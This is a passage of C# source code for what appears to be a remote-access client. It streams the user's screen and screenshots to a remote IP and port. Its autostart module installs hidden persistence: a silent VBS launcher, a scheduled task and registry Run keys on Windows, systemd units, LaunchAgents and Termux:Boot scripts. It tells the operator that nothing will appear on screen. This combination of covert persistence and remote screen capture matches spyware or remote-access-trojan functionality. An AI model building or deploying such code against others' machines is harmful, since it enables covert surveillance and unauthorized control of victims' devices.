            case "maim": return FromFile(new[] { "maim" });
            default: throw new IOException("unknown capture backend " + name);
        }
    }

    private static (int Lo, int Hi) LuminanceExtrema(Image<Rgba32> image)
    {
        var lo = 255;
        var hi = 0;
        image.ProcessPixelRows(accessor =>
        {
            for (var y = 0; y < accessor.Height; y += 8)
            {
                var row = accessor.GetRowSpan(y);
                for (var x = 0; x < row.Length; x += 8)
                {
                    var p = row[x];
                    var lum = (p.R * 299 + p.G * 587 + p.B * 114) / 1000;
                    if (lum < lo) lo = lum;
                    if (lum > hi) hi = lum;
                }
            }
        });
        return (lo, hi);
    }

    public static Image<Rgba32> FitScreen(Image<Rgba32> image, (int W, int H) maxSize)
    {
        if (image.Width <= maxSize.W && image.Height <= maxSize.H) return image;
        image.Mutate(x => x.Resize(new ResizeOptions
        {
            Size = new Size(maxSize.W, maxSize.H),
            Mode = ResizeMode.Max,
            Sampler = KnownResamplers.Lanczos3
        }));
        return image;
    }

    public static void DrawCursorOverlay(Image<Rgba32> image, PointF? position = null)
    {
        if (_captureHasCursor) return;
        try
        {
            position ??= CursorHotspot(new Size(image.Width, image.Height));
            if (position == null) return;
            var scale = Math.Clamp(image.Width / 1366.0f, 0.7f, 1.6f);
            var x = Math.Clamp((int)MathF.Round(position.Value.X), 0, Math.Max(0, image.Width - 2));
            var y = Math.Clamp((int)MathF.Round(position.Value.Y), 0, Math.Max(0, image.Height - 2));
            Point[] points =
            {
                new(x, y),
                new(x + (int)(17 * scale), y + (int)(15 * scale)),
                new(x + (int)(9 * scale), y + (int)(16 * scale)),
                new(x + (int)(13 * scale), y + (int)(25 * scale)),
                new(x + (int)(8 * scale), y + (int)(27 * scale)),
                new(x + (int)(4 * scale), y + (int)(18 * scale)),
                new(x, y + (int)(23 * scale))
            };
            FillPolygon(image, points, new Rgba32(255, 255, 255, 245));
            for (var i = 0; i < points.Length; i++)
                DrawLine(image, points[i], points[(i + 1) % points.Length], new Rgba32(0, 0, 0, 255), 2);
        }
        catch { }
    }

    private static void FillPolygon(Image<Rgba32> image, Point[] points, Rgba32 fill)
    {
        var minY = points.Min(p => p.Y);
        var maxY = points.Max(p => p.Y);
        for (var y = Math.Max(0, minY); y <= Math.Min(image.Height - 1, maxY); y++)
        {
            var nodes = new List<int>();
            for (var i = 0; i < points.Length; i++)
            {
                var a = points[i];
                var b = points[(i + 1) % points.Length];
                if ((a.Y < y && b.Y >= y) || (b.Y < y && a.Y >= y))
                {
                    var t = (double)(y - a.Y) / (b.Y - a.Y);
                    nodes.Add((int)Math.Round(a.X + t * (b.X - a.X)));
                }
            }
            nodes.Sort();
            for (var i = 0; i + 1 < nodes.Count; i += 2)
            {
                for (var x = Math.Max(0, nodes[i]); x <= Math.Min(image.Width - 1, nodes[i + 1]); x++)
                    Blend(image, x, y, fill);
            }
        }
    }

    private static void Blend(Image<Rgba32> image, int x, int y, Rgba32 src)
    {
        var dst = image[x, y];
        var a = src.A / 255f;
        image[x, y] = new Rgba32(
            (byte)(src.R * a + dst.R * (1 - a)),
            (byte)(src.G * a + dst.G * (1 - a)),
            (byte)(src.B * a + dst.B * (1 - a)),
            Math.Max(dst.A, src.A));
    }

    private static void DrawLine(Image<Rgba32> image, Point a, Point b, Rgba32 color, int width)
    {
        var dx = Math.Abs(b.X - a.X);
        var sx = a.X < b.X ? 1 : -1;
        var dy = -Math.Abs(b.Y - a.Y);
        var sy = a.Y < b.Y ? 1 : -1;
        var err = dx + dy;
        int x = a.X, y = a.Y;
        while (true)
        {
            for (var oy = -width / 2; oy <= width / 2; oy++)
                for (var ox = -width / 2; ox <= width / 2; ox++)
                {
                    var px = x + ox;
                    var py = y + oy;
                    if (px >= 0 && py >= 0 && px < image.Width && py < image.Height)
                        image[px, py] = color;
                }
            if (x == b.X && y == b.Y) break;
            var e2 = 2 * err;
            if (e2 >= dy) { err += dy; x += sx; }
            if (e2 <= dx) { err += dx; y += sy; }
        }
    }

    // ---------------------------------------------------------------------
    // Pointer position (Windows, macOS, Hyprland Wayland, X11)
    // ---------------------------------------------------------------------

    public static PointF? CursorHotspot(Size imageSize)
    {
        if (imageSize.Width <= 0 || imageSize.Height <= 0) return null;
        try
        {
            if (Platform.IsWindows)
            {
                if (!Win32.GetCursorPos(out var point)) return null;
                var left = Win32.GetSystemMetrics(76);
                var top = Win32.GetSystemMetrics(77);
                var spanX = Win32.GetSystemMetrics(78);
                var spanY = Win32.GetSystemMetrics(79);
                if (spanX <= 0 || spanY <= 0) return null;
                var x = (point.X - left) * imageSize.Width / (float)spanX;
                var y = (point.Y - top) * imageSize.Height / (float)spanY;
                if (x >= 0 && y >= 0 && x < imageSize.Width && y < imageSize.Height) return new PointF(x, y);
                return null;
            }
            if (Platform.IsDarwin) return MacPointer(imageSize);
            if (Platform.IsLinux)
            {
                if (!string.IsNullOrEmpty(Environment.GetEnvironmentVariable("WAYLAND_DISPLAY")))
                    return HyprlandPointer(imageSize);
                return X11Pointer(imageSize);
            }
        }
        catch { }
        return null;
    }

    private static PointF? MacPointer(Size imageSize)
    {
        var cg = NativeLibrary.Load("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics");
        if (cg == IntPtr.Zero) return null;
        try
        {
            var create = Marshal.GetDelegateForFunctionPointer<CGEventCreateDelegate>(
                NativeLibrary.GetExport(cg, "CGEventCreate"));
            var getLocation = Marshal.GetDelegateForFunctionPointer<CGEventGetLocationDelegate>(
                NativeLibrary.GetExport(cg, "CGEventGetLocation"));
            var release = Marshal.GetDelegateForFunctionPointer<CGEventReleaseDelegate>(
                NativeLibrary.GetExport(cg, "CGEventRelease"));
            var mainDisplay = Marshal.GetDelegateForFunctionPointer<CGMainDisplayIDDelegate>(
                NativeLibrary.GetExport(cg, "CGMainDisplayID"));
            var bounds = Marshal.GetDelegateForFunctionPointer<CGDisplayBoundsDelegate>(
                NativeLibrary.GetExport(cg, "CGDisplayBounds"));
            var ev = create(IntPtr.Zero);
            if (ev == IntPtr.Zero) return null;
            CGPoint point;
            try { point = getLocation(ev); }
            finally { release(ev); }
            var rect = bounds(mainDisplay());
            if (rect.Size.Width <= 0 || rect.Size.Height <= 0) return null;
            var x = (point.X - rect.Origin.X) * imageSize.Width / rect.Size.Width;
            var y = (point.Y - rect.Origin.Y) * imageSize.Height / rect.Size.Height;
            return x >= 0 && y >= 0 && x < imageSize.Width && y < imageSize.Height
                ? new PointF((float)x, (float)y) : null;
        }
        finally { NativeLibrary.Free(cg); }
    }

    private delegate IntPtr CGEventCreateDelegate(IntPtr source);
    private delegate CGPoint CGEventGetLocationDelegate(IntPtr ev);
    private delegate void CGEventReleaseDelegate(IntPtr ev);
    private delegate uint CGMainDisplayIDDelegate();
    private delegate CGRect CGDisplayBoundsDelegate(uint id);

    [StructLayout(LayoutKind.Sequential)]
    private struct CGPoint { public double X; public double Y; }
    [StructLayout(LayoutKind.Sequential)]
    private struct CGSize { public double Width; public double Height; }
    [StructLayout(LayoutKind.Sequential)]
    private struct CGRect { public CGPoint Origin; public CGSize Size; }

    private static readonly object HyprLock = new();
    private static (int Left, int Top, int Width, int Height)? _hyprBox;
    private static double _hyprStamp;

    private static (int Left, int Top, int Width, int Height)? HyprlandLayout()
    {
        var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
        lock (HyprLock)
            if (_hyprBox != null && now - _hyprStamp < 5.0) return _hyprBox;
        var exe = Platform.Which("hyprctl");
        if (string.IsNullOrEmpty(exe)) return null;
        (int, int, int, int)? box = null;
        try
        {
            var output = Platform.RunCapture(exe, new[] { "-j", "monitors" }, 2);
            var monitors = JsonNode.Parse(output ?? "[]") as JsonArray;
            if (monitors != null)
            {
                var lefts = new List<int>();
                var tops = new List<int>();
                var rights = new List<int>();
                var bottoms = new List<int>();
                foreach (var node in monitors)
                {
                    if (node is not JsonObject monitor) continue;
                    var x = (int)JsonUtil.Long(monitor, "x");
                    var y = (int)JsonUtil.Long(monitor, "y");
                    var w = (int)JsonUtil.Long(monitor, "width");
                    var h = (int)JsonUtil.Long(monitor, "height");
                    if (w <= 0 || h <= 0) continue;
                    lefts.Add(x); tops.Add(y); rights.Add(x + w); bottoms.Add(y + h);
                }
                if (lefts.Count > 0)
                {
                    var left = lefts.Min();
                    var top = tops.Min();
                    box = (left, top, rights.Max() - left, bottoms.Max() - top);
                }
            }
        }
        catch { box = null; }
        lock (HyprLock)
        {
            _hyprStamp = now;
            _hyprBox = box;
        }
        return box;
    }

    private static PointF? HyprlandPointer(Size imageSize)
    {
        var exe = Platform.Which("hyprctl");
        if (string.IsNullOrEmpty(exe)) return null;
        var output = Platform.RunCapture(exe, new[] { "cursorpos" }, 1);
        if (output == null) return null;
        var match = Regex.Match(output, @"(-?\d+)\s*,\s*(-?\d+)");
        if (!match.Success) return null;
        var x = int.Parse(match.Groups[1].Value, CultureInfo.InvariantCulture);
        var y = int.Parse(match.Groups[2].Value, CultureInfo.InvariantCulture);
        var box = HyprlandLayout();
        if (box == null)
            return x >= 0 && y >= 0 && x < imageSize.Width && y < imageSize.Height
                ? new PointF(x, y) : null;
        var (left, top, spanX, spanY) = box.Value;
        if (spanX <= 0 || spanY <= 0) return null;
        var px = (x - left) * imageSize.Width / (float)spanX;
        var py = (y - top) * imageSize.Height / (float)spanY;
        return px >= 0 && py >= 0 && px < imageSize.Width && py < imageSize.Height
            ? new PointF(px, py) : null;
    }

    private static PointF? X11Pointer(Size imageSize)
    {
        var display = X11.XOpenDisplay(null);
        if (display == IntPtr.Zero) return null;
        try
        {
            var root = X11.XDefaultRootWindow(display);
            if (!X11.XQueryPointer(display, root, out _, out _, out var rootX, out var rootY,
                    out _, out _, out _)) return null;
            var spanX = X11.XDisplayWidth(display, 0);
            var spanY = X11.XDisplayHeight(display, 0);
            if (spanX <= 0 || spanY <= 0) return null;
            var px = rootX * imageSize.Width / (float)spanX;
            var py = rootY * imageSize.Height / (float)spanY;
            return px >= 0 && py >= 0 && px < imageSize.Width && py < imageSize.Height
                ? new PointF(px, py) : null;
        }
        finally { X11.XCloseDisplay(display); }
    }

    // ---------------------------------------------------------------------
    // JPEG + streaming
    // ---------------------------------------------------------------------

    public static byte[] EncodeJpeg(Image<Rgba32> image, int quality)
    {
        using var stream = new MemoryStream();
        image.Save(stream, new JpegEncoder { Quality = quality });
        return stream.ToArray();
    }

    private static readonly object StreamLock = new();
    private static Thread? _streamThread;
    private static CancellationTokenSource? _streamStop;
    private static JsonNode? _streamId;

    public static bool StreamRunning()
    {
        lock (StreamLock) return _streamThread is { IsAlive: true };
    }

    public static bool StopStream(double waitSeconds = 1.5)
    {
        CancellationTokenSource? stop;
        Thread? thread;
        lock (StreamLock)
        {
            stop = _streamStop;
            thread = _streamThread;
        }
        if (stop == null) return false;
        try { stop.Cancel(); } catch { }
        if (thread != null && thread != Thread.CurrentThread)
            thread.Join(TimeSpan.FromSeconds(waitSeconds));
        return true;
    }

    public static void StartStream(Conn conn, JsonNode? fps, CancellationTokenSource stop,
        JsonNode? reqId)
    {
        Thread? thread = null;
        thread = new Thread(() =>
        {
            try { StreamScreen(conn, fps, stop, reqId); }
            catch (Exception ex)
            {
                Log.Error($"[!] screen share stopped: {ex.Message}");
                try { conn.ShutdownBoth(); } catch { }
            }
            finally
            {
                lock (StreamLock)
                {
                    if (ReferenceEquals(_streamThread, thread))
                    {
                        _streamThread = null;
                        _streamStop = null;
                        _streamId = null;
                    }
                }
            }
        }) { IsBackground = true, Name = "screenshare" };
        lock (StreamLock)
        {
            _streamThread = thread;
            _streamStop = stop;
            _streamId = reqId?.DeepClone();
        }
        thread.Start();
    }

    private static void StreamScreen(Conn conn, JsonNode? fpsNode, CancellationTokenSource stop,
        JsonNode? reqId)
    {
        double? interval = null;
        var fps = fpsNode != null ? JsonUtil.Double(new JsonObject { ["fps"] = fpsNode.DeepClone() }, "fps") : 0;
        if (fps > 0) interval = 1.0 / Math.Max(1.0, Math.Min(fps, 60.0));
        var sizes = new[] { Cfg.ScreenSize, (854, 480), (768, 432), (640, 360) };
        var sizeIndex = 0;
        var quality = Cfg.ScreenJpegQuality;
        var slowFrames = 0;
        var fastFrames = 0;
        var targetInterval = interval ?? 1.0 / 12.0;
        var slowThreshold = Math.Max(0.12, targetInterval * 0.8);
        Size? lastSize = null;
        var failed = false;
        while (!stop.IsCancellationRequested)
        {
            var start = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
            byte[] jpeg;
            try
            {
                PointF? pointer = null;
                if (lastSize != null) pointer = CursorHotspot(lastSize.Value);
                var image = GrabScreen(fast: true);
                image = FitScreen(image, sizes[sizeIndex]);
                if (pointer != null && lastSize != null)
                    pointer = new PointF(
                        pointer.Value.X * image.Width / (float)lastSize.Value.Width,
                        pointer.Value.Y * image.Height / (float)lastSize.Value.Height);
                DrawCursorOverlay(image, pointer);
                lastSize = new Size(image.Width, image.Height);
                jpeg = EncodeJpeg(image, quality);
                image.Dispose();
            }
            catch (Exception ex)
            {
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "error",
                    ["id"] = reqId?.DeepClone(),
                    ["data"] = "screenshot failed: " + ex.Message,
                    ["diag"] = CaptureDiag(ex)
                });
                failed = true;
                break;
            }

            var sendStart = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
            Protocol.SendFrame(conn, jpeg);
            var elapsedSend = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 - sendStart;
            if (elapsedSend > slowThreshold)
            {
                fastFrames = 0;
                slowFrames++;
                if (slowFrames >= 2)
                {
                    slowFrames = 0;
                    if (quality > 50) quality = Math.Max(50, quality - 6);
                    else if (sizeIndex + 1 < sizes.Length) sizeIndex++;
                }
            }
            else if (elapsedSend < Math.Min(0.08, slowThreshold * 0.55))
            {
                slowFrames = 0;
                fastFrames++;
                if (fastFrames >= 12)
                {
                    fastFrames = 0;
                    if (quality < Cfg.ScreenJpegQuality) quality = Math.Min(Cfg.ScreenJpegQuality, quality + 3);
                    else if (sizeIndex > 0) sizeIndex--;
                }
            }
            if (interval != null)
            {
                var elapsed = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 - start;
                if (elapsed < interval)
                {
                    try { Task.Delay(TimeSpan.FromSeconds(interval.Value - elapsed), stop.Token).Wait(); }
                    catch { }
                }
            }
        }
        if (!failed)
        {
            try
            {
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "output",
                    ["id"] = reqId?.DeepClone(),
                    ["data"] = "[client] screen share stopped"
                });
            }
            catch { }
        }
    }

    public static void TakeScreenshot(Conn conn, JsonNode? reqId)
    {
        try
        {
            var image = GrabScreen();
            DrawCursorOverlay(image);
            var jpeg = EncodeJpeg(image, Cfg.ScreenshotJpegQuality);
            image.Dispose();
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "image",
                ["id"] = reqId?.DeepClone(),
                ["name"] = "screenshot.jpg",
                ["data"] = Convert.ToBase64String(jpeg)
            });
        }
        catch (Exception ex)
        {
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "error",
                ["id"] = reqId?.DeepClone(),
                ["data"] = "screenshot failed: " + ex.Message,
                ["diag"] = CaptureDiag(ex)
            });
        }
    }

    private static class Win32
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int X; public int Y; }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
            public int bmiColors;
        }

        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int index);
        [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT point);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int x, int y, int w, int h,
            IntPtr hdcSrc, int srcX, int srcY, int rop);
        [DllImport("gdi32.dll")] public static extern int GetDIBits(IntPtr hdc, IntPtr hbm, uint start, uint lines,
            byte[] bits, ref BITMAPINFO info, uint usage);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr obj);
        [DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr hdc);
    }

    private static class X11
    {
        [DllImport("libX11.so.6")] public static extern IntPtr XOpenDisplay(string? name);
        [DllImport("libX11.so.6")] public static extern int XCloseDisplay(IntPtr display);
        [DllImport("libX11.so.6")] public static extern IntPtr XDefaultRootWindow(IntPtr display);
        [DllImport("libX11.so.6")]
        public static extern bool XQueryPointer(IntPtr display, IntPtr window,
            out IntPtr rootReturn, out IntPtr childReturn, out int rootX, out int rootY,
            out int winX, out int winY, out uint mask);
        [DllImport("libX11.so.6")] public static extern int XDisplayWidth(IntPtr display, int screen);
        [DllImport("libX11.so.6")] public static extern int XDisplayHeight(IntPtr display, int screen);
    }

    // The persistent portal helper is only used on GNOME Wayland where no
    // native .NET portal binding exists; it keeps the same fast per-frame path
    // as the Python client (one process, one D-Bus connection).
    private const string PortalStreamScript = @"
import os
import sys

try:
    from gi.repository import Gio, GLib
except Exception as exc:
    sys.stderr.write('PyGObject (gi) is not available: %s' % exc)
    raise SystemExit(3)

try:
    bus = Gio.bus_get_sync(Gio.BusType.SESSION, None)
except Exception as exc:
    sys.stderr.write('cannot open the session bus: %s' % exc)
    raise SystemExit(3)

unique = (bus.get_unique_name() or '').lstrip(':').replace('.', '_')
state = {'expected': '', 'done': True, 'ok': False, 'error': '',
         'uri': '', 'loop': None, 'timer': 0}


def finish(ok, text='', uri=''):
    if state['done']:
        return
    state['done'] = True
    state['ok'] = ok
    state['error'] = text
    state['uri'] = uri
    if state['loop'] is not None:
        state['loop'].quit()


def on_response(conn, sender, path, iface, signal_name, params):
    if path != state['expected'] or state['done']:
        return
    try:
        response, results = params.unpack()
    except Exception as exc:
        finish(False, 'bad portal response: %s' % exc)
        return
    if response != 0:
        finish(False, 'screenshot request refused (portal response %s)' % response)
        return
    uri = results.get('uri') if isinstance(results, dict) else None
    if hasattr(uri, 'unpack'):
        uri = uri.unpack()
    if not uri:
        finish(False, 'the portal returned no screenshot file')
        return
    finish(True, uri=str(uri))


def on_timeout():
    finish(False, 'the desktop portal did not answer within 25s')
    return False


bus.signal_subscribe('org.freedesktop.portal.Desktop',
                     'org.freedesktop.portal.Request', 'Response',
                     None, None, Gio.DBusSignalFlags.NONE, on_response)

counter = 0
for line in sys.stdin:
    if line.strip().lower() != 'shot':
        continue
    counter += 1
    token = 'cmonshot%d_%d' % (os.getpid(), counter)
    state.update(expected='/org/freedesktop/portal/desktop/request/%s/%s'
                 % (unique, token), done=False, ok=False, error='', uri='')
    state['loop'] = GLib.MainLoop()
    state['timer'] = GLib.timeout_add_seconds(25, on_timeout)
    options = {'handle_token': GLib.Variant('s', token),
               'interactive': GLib.Variant('b', False)}
    try:
        bus.call_sync('org.freedesktop.portal.Desktop',
                      '/org/freedesktop/portal/desktop',
                      'org.freedesktop.portal.Screenshot', 'Screenshot',
                      GLib.Variant('(sa{sv})', ('', options)),
                      GLib.VariantType('(o)'), Gio.DBusCallFlags.NONE,
                      10000, None)
    except Exception as exc:
        finish(False, 'portal call failed: %s' % exc)
    if not state['done']:
        state['loop'].run()
    if state['timer']:
        try:
            GLib.source_remove(state['timer'])
        except Exception:
            pass
        state['timer'] = 0
    if state['ok']:
        sys.stdout.write('OK %s\n' % state['uri'])
    else:
        sys.stdout.write('ERR %s\n' % (state['error'] or
                                       'portal screenshot failed'))
    sys.stdout.flush()
raise SystemExit(0)
";
}

// ===== Autostart.cs =====
// Autostart.cs - the `--persist` / `--remove-persist` installers.  This is a
// direct port of the persistence section of client.py: systemd user/system
// units on Linux, LaunchAgents on macOS, Termux:Boot on Android, and a hidden
// VBS launcher plus Scheduled Task/registry fallback on Windows.



public static class Autostart
{
    private static readonly object ReportGate = new();
    private static StringBuilder? _report;

    private static void Print(string text)
    {
        lock (ReportGate) _report?.AppendLine(text);
    }

    public static string Install(string ip, int port, bool silent = true, string? logFile = null)
    {
        var report = new StringBuilder();
        lock (ReportGate) _report = report;
        try
        {
            Print($"[*] OS: {Platform.GetOsInfo()}");
            Print($"[*] Mode: {(silent ? "silent (no window)" : "visible")}");
            Print($"[*] Program: {SelfExec.EntryPath} {ip} {port}");
            bool ok;
            try
            {
                if (Platform.IsAndroid()) ok = SetupAndroid(ip, port, silent, logFile);
                else if (Platform.IsIos())
                {
                    Print("[-] iOS/iPadOS does not allow persistent background apps.");
                    Print("    Apple suspends sandboxed apps about 30 seconds after they");
                    Print("    leave the foreground; only a jailbroken device can persist.");
                    ok = false;
                }
                else if (Platform.IsMacOs()) ok = SetupMacos(ip, port, silent, logFile);
                else if (Platform.IsLinux) ok = SetupLinux(ip, port, silent, logFile);
                else if (Platform.IsWindows) ok = SetupWindows(ip, port, silent, logFile);
                else
                {
                    Print($"[-] Unsupported OS: {RuntimeInformation.OSDescription}");
                    ok = false;
                }
            }
            catch (Exception ex)
            {
                Print($"[-] Unexpected error: {ex.Message}");
                ok = false;
            }
            if (ok)
            {
                Print("[+] Done. The client will start automatically after reboot/logon.");
                Print("    Nothing will appear on screen - you can close the terminal window.");
            }
        }
        finally
        {
            lock (ReportGate) _report = null;
        }
        return report.ToString().Trim();
    }

    public static string Remove()
    {
        var report = new StringBuilder();
        lock (ReportGate) _report = report;
        try
        {
            var serviceName = $"autorun-{Cfg.AutorunName}.service";
            var taskName = $"AutoRun_{Cfg.AutorunName}";
            if (Platform.IsAndroid())
            {
                var path = AndroidBootPath();
                if (File.Exists(path))
                {
                    try
                    {
                        File.Delete(path);
                        Print($"[+] Boot script removed: {path}");
                    }
                    catch (Exception ex)
                    {
                        Print($"[-] Could not remove {path}: {ex.Message}");
                    }
                }
                else Print("[-] No Termux:Boot entry found.");
                Print("[+] A running client stays up until closed or Termux is stopped.");
            }
            else if (Platform.IsIos())
            {
                Print("[-] Nothing to remove: iOS/iPadOS does not allow persistent");
                Print("    background apps, so no autostart entry can exist (stock iOS).");
            }
            else if (Platform.IsMacOs())
            {
                var label = MacosLabel();
                var plistPath = MacosPlistPath();
                var removed = false;
                if (File.Exists(plistPath))
                {
                    try
                    {
                        File.Delete(plistPath);
                        removed = true;
                    }
                    catch (Exception ex)
                    {
                        Print($"[-] Could not remove {plistPath}: {ex.Message}");
                    }
                }
                if (removed)
                {
                    RunLater(new[]
                    {
                        "launchctl", "bootout", $"gui/{Commands.Posix.getuid()}/{label}"
                    });
                }
                Print(removed ? "[+] macOS autostart removed." : "[-] No LaunchAgent found.");
                if (removed)
                    Print("[+] The auto-started client instance (if running) will stop shortly.");
            }
            else if (Platform.IsLinux)
            {
                var removed = false;
                var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var userPath = Path.Combine(home, ".config", "systemd", "user", serviceName);
                var userRemoved = false;
                if (File.Exists(userPath))
                {
                    RunQuiet("systemctl", "--user", "disable", serviceName);
                    try
                    {
                        File.Delete(userPath);
                        userRemoved = removed = true;
                    }
                    catch (Exception ex)
                    {
                        Print($"[-] Could not remove {userPath}: {ex.Message}");
                    }
                    RunQuiet("systemctl", "--user", "daemon-reload");
                }
                var systemPath = "/etc/systemd/system/" + serviceName;
                var systemRemoved = false;
                if (File.Exists(systemPath))
                {
                    if (Commands.Posix.getuid() == 0)
                    {
                        RunQuiet("systemctl", "disable", serviceName);
                        try
                        {
                            File.Delete(systemPath);
                            systemRemoved = removed = true;
                        }
                        catch (Exception ex)
                        {
                            Print($"[-] Could not remove {systemPath}: {ex.Message}");
                        }
                        RunQuiet("systemctl", "daemon-reload");
                    }
                    else Print("[-] A system service exists - remove it with sudo.");
                }
                if (userRemoved)
                    RunLater(new[] { "systemctl", "--user", "stop", serviceName });
                if (systemRemoved)
                    RunLater(new[] { "systemctl", "stop", serviceName });
                Print(removed ? "[+] Autostart removed." : "[-] No autostart entry found.");
                if (removed)
                    Print("[+] The auto-started client instance (if running) will stop shortly.");
            }
            else if (Platform.IsWindows)
            {
                RunQuiet("schtasks", "/Delete", "/TN", taskName, "/F");
                foreach (var path in new[]
                         {
                             @"Software\Microsoft\Windows\CurrentVersion\Run",
                             @"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
                         })
                {
                    try
                    {
                        using var key = Registry.CurrentUser.OpenSubKey(path, writable: true);
                        key?.DeleteValue(taskName, throwOnMissingValue: false);
                    }
                    catch { }
                }
                var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                if (string.IsNullOrEmpty(local)) local = Path.GetTempPath();
                var vbs = Path.Combine(local, "AutoRunner", $"AutoRun_{Cfg.AutorunName}.vbs");
                try { File.Delete(vbs); } catch { }
                Print("[+] Windows autostart removed.");
                Print("[+] A running client stays up until closed or rebooted.");
            }
            else
            {
                Print($"[-] Unsupported OS: {RuntimeInformation.OSDescription}");
            }
        }
        finally
        {
            lock (ReportGate) _report = null;
        }
        return report.ToString().Trim();
    }

    // ------------------------------------------------------------------
    // Common helpers
    // ------------------------------------------------------------------

    private static bool RunQuiet(params string[] command)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = command[0],
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            for (var i = 1; i < command.Length; i++) psi.ArgumentList.Add(command[i]);
            using var proc = Process.Start(psi);
            if (proc == null) return false;
            _ = proc.StandardOutput.ReadToEndAsync();
            _ = proc.StandardError.ReadToEndAsync();
            if (!proc.WaitForExit(30000))
            {
                try { proc.Kill(true); } catch { }
                return false;
            }
            return proc.ExitCode == 0;
        }
        catch { return false; }
    }

    private static (int Code, string Output) RunCapture(string exe, params string[] args)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = exe,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            foreach (var arg in args) psi.ArgumentList.Add(arg);
            using var proc = Process.Start(psi);
            if (proc == null) return (-1, "");
            var output = proc.StandardOutput.ReadToEndAsync();
            _ = proc.StandardError.ReadToEndAsync();
            if (!proc.WaitForExit(5000)) { try { proc.Kill(true); } catch { } return (-1, ""); }
            return (proc.ExitCode, output.GetAwaiter().GetResult());
        }
        catch { return (-1, ""); }
    }

    private static bool IsOmarchy()
    {
        if (Platform.IsAndroid() || Platform.IsMacOs() || Platform.IsIos() || !Platform.IsLinux)
            return false;
        try { return File.ReadAllText("/etc/os-release").ToLowerInvariant().Contains("omarchy"); }
        catch { return false; }
    }

    private static bool UserManagerRunning()
    {
        try { return Directory.Exists($"/run/user/{Commands.Posix.getuid()}/systemd"); }
        catch { return false; }
    }

    private static string Home => Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

    private static void RunLater(IEnumerable<string> argv)
    {
        if (Platform.IsWindows) return;
        try
        {
            // The helper calls setsid() before exec, so this survives the
            // service stop/clean exit that is about to happen.
            var psi = SelfExec.StartInfo("--cmon-exec", "/bin/sh", "-c",
                "sleep 3; exec \"$@\" </dev/null >/dev/null 2>&1", "sh");
            foreach (var arg in argv) psi.ArgumentList.Add(arg);
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using var proc = Process.Start(psi);
        }
        catch { }
    }

    // ------------------------------------------------------------------
    // systemd
    // ------------------------------------------------------------------

    private static string SystemdQuote(string word, bool command)
    {
        word = word.Replace("%", "%%");
        if (command) word = word.Replace("$", "$$");
        if (word.IndexOfAny(new[] { ' ', '\t', '"', '\'', '\\' }) >= 0)
        {
            word = "\"" + word.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
        }
        return word;
    }

    private static string SystemdEnvValue(string value)
    {
        value = value.Replace("\r", " ").Replace("\n", " ").Replace("%", "%%");
        if (value.IndexOfAny(new[] { ' ', '\t', '"', '\'', '\\' }) >= 0)
            value = "\"" + value.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
        return value;
    }

    private static string SystemdUserEnvironment()
    {
        var sb = new StringBuilder();
        foreach (var name in new[] { "DISPLAY", "WAYLAND_DISPLAY", "XAUTHORITY", "XDG_CURRENT_DESKTOP" })
        {
            var value = Environment.GetEnvironmentVariable(name);
            if (!string.IsNullOrEmpty(value))
                sb.Append($"Environment={name}={SystemdEnvValue(value)}\n");
        }
        return sb.ToString();
    }

    private static string ServiceBody(string execCmd, bool silent, string? logFile,
        string? after, string wanted, string userLine, string envLines = "")
    {
        string output;
        if (!string.IsNullOrEmpty(logFile))
            output = "append:" + Path.GetFullPath(logFile).Replace("%", "%%");
        else if (silent) output = "null";
        else output = "journal";

        var afterLine = after == null ? "" : $"After={after}\n";
        var dir = Path.GetDirectoryName(SelfExec.EntryPath) ?? "";
        var workingDir = dir.Replace("%", "%%");
        return
            "[Unit]\n" +
            $"Description=Auto-run for {Cfg.AutorunName.Replace("%", "%%")}\n" +
            afterLine +
            "\n" +
            "[Service]\n" +
            "Type=simple\n" +
            envLines +
            userLine +
            $"ExecStart={execCmd}\n" +
            $"WorkingDirectory={workingDir}\n" +
            "Restart=on-failure\n" +
            "RestartSec=3\n" +
            "StandardInput=null\n" +
